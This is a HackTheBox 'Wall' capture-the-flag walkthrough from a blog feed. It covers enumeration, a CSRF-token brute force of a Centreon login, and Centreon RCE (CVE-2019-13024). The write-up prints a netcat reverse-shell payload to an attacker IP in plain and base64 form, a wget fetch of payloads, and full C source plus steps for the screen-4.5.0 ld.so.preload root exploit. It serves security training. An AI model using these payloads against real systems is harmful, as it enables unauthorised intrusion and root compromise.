<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HackTheBox - Wall</title>
      <link href="/2019-07-12/HackTheBox-Wall/"/>
      <url>/2019-07-12/HackTheBox-Wall/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/wall/wall-detail.png" alt="HackTheBox-Wall/Nmap.png" title="Wall machine details"></p><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   → Wall is running a Web Application that vulnerable to <code>RCE</code>(Remote Code Execution), a classification of security vulnerabilities. <code>RCE</code> enables a remote attacker to execute arbitrary code, bypassing security authorization, and from this I can get in to the machine. First I fall on to the rabbit hole which is the <code>aa.php</code>, and <code>server-status</code> page. The tricky part of this machine was finding the hidden page of the web application because it’s not something normally shows up in the wordlists. I use the Burp Suite and edit the Request fo find some interesting and then i found the right page of the webapps. The vulnerability inside is a <code>SUID</code> binary which users can get a full privileges.</p><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>→ Nmap scan</p><p>→ discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>→ Browsing the HTTP Service</p><p>→ Bruteforce the Web page directories</p><p>→ Finding the hidden page</p></li><li><p><strong>Post - Exploitation</strong></p><p>→ Exploring the web page</p><p>→ Bruteforce the credentials using the token</p><p>→ Logging in as admin</p></li><li><p><strong>Exploitation</strong></p><p>→ Getting the Reverse shell using <a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/" target="_blank" rel="noopener">CVE-2019-13024</a>.</p><p>→ Find some interesting things</p><p>→ Check Linux Binaries</p></li><li><p><strong>Privilege Escalation</strong></p><p>→ Exploit the unusual Linux binaries</p><p>→ Execute the exploit</p><p>→ Get the root shell and read the root and user file</p></li></ol><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>→ First, is to scan the target IP using <strong>Nmap</strong> to get information about the various services that are running on the target machine. We use</p><hr><ul><li>-sV ⇒ Probe open ports to determine service/version info</li><li>-sC ⇒ equivalent to —script=default</li><li>-A  ⇒ Enable OS detection, version detection, script scanning, and traceroute</li><li>-oN ⇒ to save our scan results to a text file</li></ul><hr><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"><span class="string">nmap</span> <span class="string">-sV</span> <span class="string">-sC</span> <span class="string">-A</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.157</span> <span class="string">-oN</span> <span class="string">nmap-Wall</span></span><br></pre></td></tr></table></figure><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p><img src="/img/wall/Nmap.png" alt="HackTheBox-Wall/Nmap.png" title="Nmap Results"></p><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>By visiting the http page we got the default page of Apache Web Server<br><img src="/img/wall/default_page.png" alt="HackTheBox-Wall/default_page.png" title="Apache Defaul page"></p><p>We try to explore the default page by inspecting the source code but I can’t find any interesting things there so I’ll try to bruteforce the directories to look for hidden page. I use <strong><a href="https://github.com/OJ/gobuster" target="_blank" rel="noopener">gobuster</a></strong> with medium.txt file. To save the outfile we use <code>-o</code> <code>name of a file</code></p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">gobuster dir -u http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">10.157</span> -w <span class="regexp">/usr/</span>share<span class="regexp">/dirbuster/</span>wordlists<span class="regexp">/directory-list-lowercase-2.3-medium.txt -o wall-dir</span></span><br></pre></td></tr></table></figure><p><img src="/img/wall/gobuster.png" alt="HackTheBox-Wall/gobuster.png" title="Gobuster"></p><p>After a minutes of bruteforcing I got the following directories.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gobuster results</span></span><br><span class="line"></span><br><span class="line">→ /aa.php  (Status: 200)</span><br><span class="line"></span><br><span class="line">→ /server-status  (Status: 401)</span><br><span class="line"></span><br><span class="line">→ /monitoring  (Status: 403)</span><br></pre></td></tr></table></figure><p>Now let’s take a look with the following page I got. First the “aa.php”<br><code>http://10.10.10.157/aa.php</code></p><p><img src="/img/wall/aa_page.png" alt="HackTheBox-Wall/aa_page.png" title="aa.php page"><br>No interesting things here.</p><p>So next the <code>server-status</code> page<br><code>http://10.10.10.157/server-status</code></p><p><img src="/img/wall/forbidden.png" alt="HackTheBox-Wall/forbidden.png" title="forbidden page"><br>And I got the Forbidden page.</p><p>Next the is the <code>monitoring</code> page<br><code>http://10.10.10.157/monitoring</code></p><p><img src="/img/wall/monitoring.png" alt="HackTheBox-Wall/monitoring.png" title="monitoring page"></p><p>And I got a pop-up login. This page is very interesting but I don’t have any credentials so i will leave this for a while and try to enumerate again the machine using <a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">Nikto</a> - Web Server scanner.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">nikto -h http://10.10.10.157/</span><br></pre></td></tr></table></figure><h3 id="Nikto-results"><a href="#Nikto-results" class="headerlink" title="Nikto results"></a>Nikto results</h3><p><img src="/img/wall/nikto.png" alt="HackTheBox-Wall/nikto.png" title="nikto results"></p><p>Next is I will intercept this request with <a href="https://portswigger.net/burp" target="_blank" rel="noopener">BurpSuite</a> (A Web Penetration Testing tool) and send this to Repeater.</p><p><img src="/img/wall/burp.png" alt="HackTheBox-Wall/burp.png" title="Burp Suite"></p><p>Repeater<br><img src="/img/wall/burp_repeater.png" alt="HackTheBox-Wall/burp_repeater.png" title="Burp Suite Repeater"></p><p>Now we will change the request body method into “POST” and let’s see what response we can get.<br><img src="/img/wall/burp_centreon.png" alt="HackTheBox-Wall/burp_centreon.png" title="The centreon page"></p><p>As you can see there’s a redirected page in URL=<code>&#39;/centreon&#39;</code> so I try this on browser to find out what is this.</p><p><img src="/img/wall/centreon_login.png" alt="HackTheBox-Wall/centreon_login.png"></p><h3 id="Centreon-Login-Page-v-19-04"><a href="#Centreon-Login-Page-v-19-04" class="headerlink" title="Centreon Login Page v. 19.04"></a>Centreon Login Page v. 19.04</h3><p>Then a Centreon Login page with version 19.04. Centreon is an open source infrastructure monitoring software.<br>Based on some googling for default creds also in the documentation of the software, I tried all combinations of “centreon”, “admin”, and “root”, but didn’t get logged in.</p><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><h3 id="Finding-Exploit"><a href="#Finding-Exploit" class="headerlink" title="Finding Exploit"></a>Finding Exploit</h3><p>I try to explore the login page by viewing the page source code and try to look if there’s any interesting things.<br>I also google the version of the <code>Centreon v19.04</code> and I found out that the version of this software is vulnerable to RCE(<a href="https://www.sciencedirect.com/topics/computer-science/remote-code-execution" target="_blank" rel="noopener">Remote Code Execution</a>) attack.</p><h3 id="Login-page-view-page-source"><a href="#Login-page-view-page-source" class="headerlink" title="Login page view page source"></a>Login page view page source</h3><p><img src="/img/wall/view_source.png" alt="HackTheBox-Wall/view_source.png" title="Page source"></p><h3 id="Brute-Force-the-Credentials"><a href="#Brute-Force-the-Credentials" class="headerlink" title="Brute Force the Credentials"></a>Brute Force the Credentials</h3><p>By viewing the page source code, there’s a hidden value of Centreon <code>CSRF</code> token. After some research luckily I found this <a href="https://github.com/J3wker/anti-CSRF_Token-Bruteforce" target="_blank" rel="noopener">script</a> on Github that can use to bruteforce the logins which are using <code>anti-CSRF</code> tokens to stop you from brute forcing them. I try to use this by the following commands based on the instructions of the script.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash shell</span></span><br><span class="line">python3 brutecsrf.py --url http://test.com/index.php --csrf name_csrf_token_in_HTML_form --u admin --fuser user_name_in_HTML_form --passwd password_name_in_HTML_form</span><br></pre></td></tr></table></figure><p><img src="/img/wall/password1.png" alt="HackTheBox-Wall/password1.png" title="Login page password"></p><p>After a minute I get the “password1” now try to use this password for login with default username “admin” ;) then I can now logged in !</p><p><img src="/img/wall/centreon.png" alt="HackTheBox-Wall/centreon.png"><br><strong>Centreon Main Page</strong></p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>We know that the Centreon version on this machine was vulnerable to RCE(<a href="https://www.sciencedirect.com/topics/computer-science/remote-code-execution" target="_blank" rel="noopener">Remote Code Execution</a>) attack. So I did search on Google to find an article about it and what I saw was article from creator (Askar) of this box.</p><p><img src="/img/wall/google1.png" alt="HackTheBox-Wall/google1.png"></p><h2 id="Exploit-Blog-for-Centreon"><a href="#Exploit-Blog-for-Centreon" class="headerlink" title="Exploit Blog for Centreon"></a>Exploit Blog for Centreon</h2><p>Centreon v19.04 Remote Code Execution. (CVE-2019-13024)</p><a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/" class="link-preview" target="rel"><div class="link-area"><div class="og-image"><img src="https://shells.systems/wp-content/uploads/2019/06/post-exploit.png"></img></div><div class="descriptions"><div class="og-title">Centreon v19.04 Remote Code Execution (CVE-2019-13024) - Shells.Systems</div><div class="og-description">Estimated Reading Time:  6 minutes Summary about Centreon Centreon is a free and open source infrastructure monitoring software, Centreon al…</div></div></div></a><hr><p>The exploitation triggers by adding an arbitrary command in the <code>nagios_bin</code> parameter when setup a new configuration or update configuration for a poller.</p><p><img src="/img/wall/payload_line.png" alt="HackTheBox-Wall/payload_line.png"></p><p>Based on the blog we can set a payload in <code>Monitoring Engine Binary</code>.</p><p>I tried to use the exploit script but it’s not working, I didn’t get a reverse shell, my Ncat listener can’t get any response whenever I run the exploit even I modified it.<br>So i tried to encode my payload into base64 hoping that this one will work.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># My payload</span></span><br><span class="line">rm /tmp/x22;mkfifo /tmp/xx2;cat /tmp/xx2|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.15.44 666 &gt;/tmp/xx2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># convert to base64</span></span><br><span class="line">cm0gL3RtcC94MjI7bWtmaWZvIC90bXAveHgyO2NhdCAvdG1wL3h4MnwvYmluL3NoIC1pIDI+JjF8L2Jpbi9uYyAxMC4xMC4xNS40NCA2NjYgPi90bXAveHgy</span><br></pre></td></tr></table></figure><p>Now I will paste our base64 code payload into <code>Monitoring Engine Binary</code>.</p><p>In the exploit script i will paste my payload too in <code>nagios_bin</code> line. with echo${IFS}</p><p>After running the exploit with my Ncat listener, still didn’t work. So I tried to search again on Google to look for other exploit of Centreon RCE and i found <a href="https://github.com/get-get-get-get/Centreon-RCE" target="_blank" rel="noopener">this.</a> Same procedure I will paste again my payload to <code>nagios_bin</code> line and next is run the exploit with my Ncat listener.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./centreon_rce.py -t http://10.10.10.157/centreon -u admin -p password1</span><br></pre></td></tr></table></figure><h3 id="WWW-DATA-SHELL-gt-shelby"><a href="#WWW-DATA-SHELL-gt-shelby" class="headerlink" title="WWW-DATA SHELL -&gt; shelby"></a>WWW-DATA SHELL -&gt; shelby</h3><p>Running this and we now get the www-data shell.<br><img src="/img/wall/www_data_shell.png" alt="HackTheBox-Wall/www_data_shell.png" title="WWW-DATA SHELL"></p><p>As you can see Bash’s job control is turned off. using this line we can enable bash command in the shell.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure><p>Now I can use commands like “id”.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)</span><br></pre></td></tr></table></figure><p>upgrade the shell with python</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash");'</span></span><br></pre></td></tr></table></figure><p><img src="/img/wall/right_shell.png" alt="HackTheBox-Wall/right_shell.png" title="www-data@Wall shell"></p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h2 id="Linux-SUID-Binaries"><a href="#Linux-SUID-Binaries" class="headerlink" title="Linux SUID Binaries"></a>Linux SUID Binaries</h2><p>Now it’s time to find some interesting things in this machine that I can use for Privilege Escalation. First I look into Linux SUID binaries. and I spotted something odd, the <code>screen</code> with version 4-5.0 was the biggest hint for me.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null | xargs ls -la</span><br></pre></td></tr></table></figure><p><img src="/img/wall/screen.png" alt="HackTheBox-Wall/screen.png" title="screen-4-5.0"></p><h3 id="Screen-4-5-0"><a href="#Screen-4-5-0" class="headerlink" title="Screen 4-5.0"></a>Screen 4-5.0</h3><p>If you are familiar with Linux SUID’ you will notice that the “/bin/screen-4.5.0” is not a normally or default Linux suid so this one is very interesting so trying to use <a href="https://github.com/offensive-security/exploitdb/blob/master/searchsploit" target="_blank" rel="noopener">Searchsploit</a> if there’s an existing exploit in “screen-4.5.0”. And there is.</p><p><img src="/img/wall/searchsploit.png" alt="HackTheBox-Wall/searchsploit.png" title="searchsploit results"></p><p>I read first the .txt file of the exploit to know on how can I use this for exploitation.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit -x exploits/linux/<span class="built_in">local</span>/41152.txt</span><br></pre></td></tr></table></figure><p><img src="/img/wall/screen_readme.png" alt="HackTheBox-Wall/screen_readme.png" title="screen readme"></p><p>It check opens the logfile with full root privileges. This allows us to truncate any file or create a root-owned file with any contents in any directory and can be easily exploited to full root acces in several ways.</p><p>Base on the instructions of the exploit, I will try to create a file “bla-bla” then use this commands “ls -la”</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -D -m -L bla.bla <span class="built_in">echo</span> fail</span><br><span class="line"></span><br><span class="line">ls -la</span><br></pre></td></tr></table></figure><p><img src="/img/wall/blabla.png" alt="HackTheBox-Wall/blabla.png" title="blabla"></p><p>As you can see, the “bla.bla” file is owned by root.</p><p>I will now use the exploit script we get on the searchsploit, but it didn’t work properly so I did it manually, first I compiled the binaries on my Kali machine:</p><h3 id="libhax-c-code"><a href="#libhax-c-code" class="headerlink" title="libhax.c - code"></a>libhax.c - code</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// libhax</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dropshell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    chown(<span class="string">"/tmp/rootshell"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">"/tmp/rootshell"</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] done!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="rootshell-c-code"><a href="#rootshell-c-code" class="headerlink" title="rootshell.c - code"></a>rootshell.c - code</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// rootshell</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">"/bin/sh"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now is to compile this two exploit.</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// libhax</span></span><br><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line"></span><br><span class="line"><span class="comment">// and then the rootshell</span></span><br><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure><p>After I compile the exploit i’ll transfer it to the target. To transfer the file I set a local HTTP Server in my Kali machine.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">80</span></span><br></pre></td></tr></table></figure><p>to download it into Wall machine, we can use <code>wget</code> commands in the <code>tmp</code> directory.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># download the libhax</span></span><br><span class="line">wget http://10.10.15.44/libhax.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># next is the rootshell</span></span><br><span class="line">wget http://10.10.15.44/libhax.c</span><br></pre></td></tr></table></figure><h2 id="Going-to-Root"><a href="#Going-to-Root" class="headerlink" title="Going to Root"></a>Going to Root</h2><p>Now i will go to the “/etc/“ directories in the target and do the exploit</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@Wall:&#x2F;tmp$ cd &#x2F;etc</span><br><span class="line">cd &#x2F;etc</span><br><span class="line">www-data@Wall:&#x2F;etc$ umask 000</span><br><span class="line">umask 000</span><br><span class="line">www-data@Wall:&#x2F;etc$ &#x2F;bin&#x2F;screen-4.5.0 -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;libhax.so&quot;</span><br><span class="line">&#x2F;libhax.so&quot;-4.5.0 -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;</span><br><span class="line">www-data@Wall:&#x2F;etc$ &#x2F;bin&#x2F;screen-4.5.0 -ls</span><br><span class="line">&#x2F;bin&#x2F;screen-4.5.0 -ls</span><br><span class="line">&#39; from &#x2F;etc&#x2F;ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="line">[+] done!</span><br><span class="line">No Sockets found in &#x2F;tmp&#x2F;screens&#x2F;S-www-data.</span><br></pre></td></tr></table></figure><p>Now going to “/tmp/rootshell”</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@Wall:&#x2F;etc$ &#x2F;tmp&#x2F;rootshell</span><br><span class="line">&#x2F;tmp&#x2F;rootshell</span><br><span class="line"># id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),33(www-data),6000(centreon)</span><br><span class="line"># cat &#x2F;home&#x2F;shelby&#x2F;user.txt | wc -c</span><br><span class="line">cat &#x2F;home&#x2F;shelby&#x2F;user.txt | wc -c</span><br><span class="line">33</span><br><span class="line"># cat &#x2F;root&#x2F;root.txt | wc -c</span><br><span class="line">cat &#x2F;root&#x2F;root.txt | wc -c</span><br><span class="line">33</span><br><span class="line">#</span><br></pre></td></tr></table></figure><p><img src="/img/wall/rooted!!.png" alt="HackTheBox-Wall/rooted!!.png" title="Machine Pawned!!"></p><p>Now that I’m root, I can now grab both flags – <code>user.txt</code> &amp; <code>root.txt</code> :)</p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> htb </tag>
            
            <tag> pentest </tag>
            
            <tag> cve </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
